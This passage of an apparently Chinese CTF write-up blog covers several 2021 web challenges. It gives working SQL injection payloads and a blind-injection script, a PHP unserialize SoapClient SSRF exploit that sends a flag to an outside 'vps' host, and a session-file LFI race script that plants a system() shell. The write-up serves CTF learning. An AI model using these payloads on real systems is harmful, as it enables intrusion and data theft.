class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(is_array($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) || is_array($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Genji:We will see again Hanzo&#x27;</span>.$flag.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong!&#x27;</span>;&#125;<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just G1ve it a try.&#x27;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>sha1哈希碰撞</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> urllib.requestrotimi = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-1.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];letmein = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-2.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>]; r = requests.get(<span class="hljs-string">&#x27;http://tc.rigelx.top:8003/baby_revenge.php&#x27;</span>, params=&#123;<span class="hljs-string">&#x27;user&#x27;</span>: rotimi, <span class="hljs-string">&#x27;pass&#x27;</span>: letmein&#125;);print(r.text)<span class="hljs-comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre><p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>第四关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=getenv(<span class="hljs-string">&#x27;flllllllllag&#x27;</span>);<span class="hljs-keyword">if</span>(strstr(<span class="hljs-string">&quot;Longlone&quot;</span>,$_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no!&lt;br&gt;&quot;</span>);  <span class="hljs-keyword">exit</span>();&#125;$_GET[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: <span class="hljs-subst">$flag</span>&quot;</span>;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>url编码脚本</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$string = <span class="hljs-string">&#x27;Longlone&#x27;</span>; <span class="hljs-comment">//需要二次编码的字符或字符串</span>$result = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($string);$i++)&#123;    $char = $string[$i];    <span class="hljs-keyword">for</span> ($ascii1 = <span class="hljs-number">0</span>; $ascii1 &lt; <span class="hljs-number">256</span>; $ascii1++) &#123;        <span class="hljs-keyword">for</span> ($ascii2 = <span class="hljs-number">0</span>; $ascii2 &lt; <span class="hljs-number">256</span>; $ascii2++) &#123;            $aaa = <span class="hljs-string">&#x27;%&#x27;</span>.$ascii1.<span class="hljs-string">&#x27;%&#x27;</span>.$ascii2;            <span class="hljs-keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123;                <span class="hljs-keyword">echo</span> $char.<span class="hljs-string">&#x27;: &#x27;</span>.$aaa;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;                $result = $result.$aaa;                <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">echo</span> $result;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p><code>right函数</code></p><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);+------------------+| RIGHT(&#39;MySQL&#39;,3) |+------------------+| SQL              |+------------------+1 row in set (0.00 sec)</code></pre><p><code>left函数</code></p><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);+-----------------------+| LEFT(&#39;MySQL LEFT&#39;, 5) |+-----------------------+| MySQL                 |+-----------------------+1 row in set</code></pre><p><code>mid函数</code>—–和substr差不多</p><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);+-------------------+| mid(&#39;adbdab&#39;,3,2) |+-------------------+| bd                |+-------------------+1 row in set (0.01 sec)</code></pre><p>substr被过了就用上面三个代替</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl=<span class="hljs-string">&#x27;http://47.100.242.70:4725/check.php&#x27;</span>strr=string.printableres=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strr:        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;easysql&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;syclover&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        payload=<span class="hljs-string">&quot;admi&#x27;or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;</span>.<span class="hljs-built_in">format</span>(i,s)        <span class="hljs-comment">#print(payload)</span>        data=&#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;adm&quot;</span>,<span class="hljs-string">&quot;wp-submit&quot;</span>:<span class="hljs-string">&quot;%E7%99%BB%E5%BD%95&quot;</span>&#125;        r=requests.post(url,data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:            res+=s            print(res)            <span class="hljs-keyword">break</span></code></pre><p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;    <span class="hljs-keyword">public</span> $par0;    <span class="hljs-keyword">public</span> $par1;    <span class="hljs-keyword">public</span> $par2;    <span class="hljs-keyword">public</span> $par3;    <span class="hljs-keyword">public</span> $kelasi;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$par0,$par1,$par2,$par3</span>)</span>&#123;        <span class="hljs-keyword">$this</span> -&gt; par0 = $par0;        <span class="hljs-keyword">$this</span> -&gt; par1 = $par1;        <span class="hljs-keyword">$this</span> -&gt; par2 = $par2;        <span class="hljs-keyword">$this</span> -&gt; par3 = $par3;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newOne</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span> -&gt; kelasi = <span class="hljs-keyword">new</span> <span class="hljs-keyword">$this</span> -&gt; par0(<span class="hljs-keyword">$this</span> -&gt; par1,<span class="hljs-keyword">$this</span> -&gt; par2);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wuhu</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;syclover    !&#x27;</span>.<span class="hljs-keyword">$this</span> -&gt; kelasi.<span class="hljs-string">&#x27;     yyds&#x27;</span>);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">qifei</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//$ser = serialize($this -&gt; kelasi);</span>        <span class="hljs-comment">//$unser = unserialize($ser);</span>        <span class="hljs-keyword">$this</span> -&gt; kelasi -&gt; juts_a_function();    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par1) || <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par2)))&#123;            <span class="hljs-keyword">$this</span> -&gt; newOne();            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span> -&gt; par3 == <span class="hljs-string">&#x27;unser&#x27;</span>)&#123;                <span class="hljs-keyword">$this</span> -&gt; qifei();            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">$this</span> -&gt; wuhu();            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span> -&gt; par2.<span class="hljs-string">&#x27;hint.php&#x27;</span>);    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);$hack = $_GET[<span class="hljs-string">&#x27;hack&#x27;</span>];unserialize($hack);</code></pre><p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p><p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p><p><code>hint.php</code> </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$hint = <span class="hljs-string">&#x27;向管理员的页面post一个参数message(告诉他，&quot;iwantflag&quot;) 和 另一个参数 url（它会向这个url发送一个flag&#x27;</span>;$hint .= <span class="hljs-string">&#x27;管理员的页面在当前目录下一个特殊文件夹里&#x27;</span>;$hint .= <span class="hljs-string">&#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;</span>;</code></pre><p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p><p>读取两次</p><p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png"><br>这个只能读一行，只有个<code>&lt;?php</code></p><p>接下来<code>SoapClient打SSRF</code></p><p>官方exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;<span class="hljs-keyword">public</span> $par0;<span class="hljs-keyword">public</span> $par1;<span class="hljs-keyword">public</span> $kelasi;<span class="hljs-keyword">public</span> $par2;<span class="hljs-keyword">public</span> $par3;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name,$par1,$par2,$par3</span>)</span>&#123;<span class="hljs-keyword">$this</span> -&gt; par0 = $name;<span class="hljs-keyword">$this</span> -&gt; par1 = $par1;<span class="hljs-keyword">$this</span> -&gt; par2 = $par2;<span class="hljs-keyword">$this</span> -&gt; par3 = $par3;&#125;&#125;$postdata = <span class="hljs-string">&#x27;message=iwantflag&amp;url=http://vps:9999&#x27;</span>;<span class="hljs-comment">//按要求设置post数据</span>$url = <span class="hljs-string">&#x27;http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php&#x27;</span>;<span class="hljs-comment">//payload1 = new fxxk(&#x27;&#x27;,&#x27;&#x27;,&#x27;php://filter/read=convert.base64-encode/resource=./&#x27;,&#x27;&#x27;);#伪协议读hint</span><span class="hljs-comment">//payload2 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./&#x27;,1,&#x27;echoo&#x27;);#列目录</span><span class="hljs-comment">//payload3 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./aaaaaaaaaaafxadwagaefae&#x27;,1,&#x27;echoo&#x27;);#列目录</span>$payload4 = <span class="hljs-keyword">new</span> fxxk(<span class="hljs-string">&#x27;SoapClient&#x27;</span>,<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $url,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt;<span class="hljs-string">&#x27;wupco&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Type:&#x27;</span>.<span class="hljs-string">&#x27;Application/X-WWW-Form-Urlencoded&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Length:&#x27;</span>.(<span class="hljs-keyword">string</span>)strlen($postdata).<span class="hljs-string">&#x27;!!!!&#x27;</span>.$postdata.<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span> =&gt;<span class="hljs-string">&#x27;baaa&#x27;</span>),<span class="hljs-string">&#x27;unser&#x27;</span>);$soa = str_replace(<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,serialize($payload4));<span class="hljs-keyword">echo</span>(urlencode($soa));</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png"></p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png"></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">import</span> ddddocr<span class="hljs-keyword">import</span> onnxruntime<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decodeurl = <span class="hljs-string">&quot;http://110.42.233.91:88/access&quot;</span>sess = requests.Session()ocr = ddddocr.DdddOcr(use_gpu=<span class="hljs-literal">True</span>)onnxruntime.set_default_logger_severity(<span class="hljs-number">3</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pic_to_text</span>(<span class="hljs-params">text</span>):</span>    img = re.findall(<span class="hljs-string">r&quot;base64,(.*?)&gt;&quot;</span>, text)[<span class="hljs-number">0</span>]    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(b64decode(img.encode()))    v_code = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>)    v_code.convert(<span class="hljs-string">&quot;L&quot;</span>)    v_code.save(<span class="hljs-string">&quot;v_code.png&quot;</span>)    v_code_bytes = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;v_code.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()    code = ocr.classification(v_code_bytes)    os.remove(<span class="hljs-string">&quot;v_code.png&quot;</span>)    <span class="hljs-keyword">return</span> code.lower()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate</span>(<span class="hljs-params">text</span>):</span>    cnt = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&quot;done (.*?) times&quot;</span>, text)[<span class="hljs-number">0</span>])    <span class="hljs-keyword">if</span> cnt == <span class="hljs-number">1000</span>:        print(text)        <span class="hljs-keyword">return</span>    code = pic_to_text(text)    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(code) != <span class="hljs-number">4</span>:        <span class="hljs-keyword">return</span>    data = &#123;        <span class="hljs-string">&quot;v_code&quot;</span>: code    &#125;    sess.post(url, data)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        res = sess.get(url)        validate(res.text)        time.sleep(<span class="hljs-number">2</span>)</code></pre><p>不过这个脚本运行报错，等之后看看吧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>geekchallenge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HECTF</title>
    <link href="/2021/11/16/HECTF/"/>
    <url>/2021/11/16/HECTF/</url>
    
    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-string">&#x27;./index.php&#x27;</span>);    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, waittarget = <span class="hljs-string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>session = requests.session()flag = <span class="hljs-string">&#x27;aaaa&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">e: threading.Event</span>):</span>    files = [        (<span class="hljs-string">&#x27;value&#x27;</span>, (<span class="hljs-string">&#x27;load.png&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40960</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>)),    ]    data = &#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;cat /f1aggggggggggggggggggggggg&quot;);?&gt;&#x27;); echo(&#x27;<span class="hljs-subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;    <span class="hljs-comment">#data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;ls /&quot;);?&gt;&#x27;); ?&gt;&#x27;&#x27;&#x27;&#125;</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        requests.post(            target,            data=data,            files=files,            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,        )<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">e: threading.Event</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        response = requests.get(            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>,        )        <span class="hljs-keyword">if</span> flag.encode() <span class="hljs-keyword">in</span> response.content:            e.<span class="hljs-built_in">set</span>()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    futures = []    event = threading.Event()    pool = ThreadPoolExecutor(<span class="hljs-number">15</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):        futures.append(pool.submit(upload, event))    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):        futures.append(pool.submit(write, event))    wait(futures)</code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>session文件包含写shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackergame2021</title>
    <link href="/2021/11/07/hackergame2021/"/>
    <url>/2021/11/07/hackergame2021/</url>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png"></p><p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p><p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p><p>也可以用二分法</p><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 16349792471634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png"><br>显然，69是组合不出20的</p><p>需要猜测源码，<code>intval</code></p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    check_last_action();    $bottle_6 = intval($_POST[<span class="hljs-string">&#x27;b6&#x27;</span>]);    $bottle_9 = intval($_POST[<span class="hljs-string">&#x27;b9&#x27;</span>]);    <span class="hljs-keyword">if</span> ($bottle_6 &lt; <span class="hljs-number">0</span> || $bottle_9 &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;操作无效：不能放负数个瓜。点击&lt;a href=&quot;/&quot;&gt;这里&lt;/a&gt;回到主页。&#x27;</span>);    &#125;    $_SESSION[<span class="hljs-string">&#x27;pool&#x27;</span>] += intval($bottle_6 * <span class="hljs-number">6</span> + $bottle_9 * <span class="hljs-number">9</span>);    header(<span class="hljs-string">&#x27;Location: /&#x27;</span>);&#125;</code></pre><p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> PHP_INT_MAX;   <span class="hljs-comment">//9223372036854775807</span>$a=<span class="hljs-number">9223372036854775807</span>;$b=<span class="hljs-number">9223372036854775808</span>;$ia=intval($a);$ib=intval($b);var_dump($a);   <span class="hljs-comment">//int(9223372036854775807)</span>var_dump($b);   <span 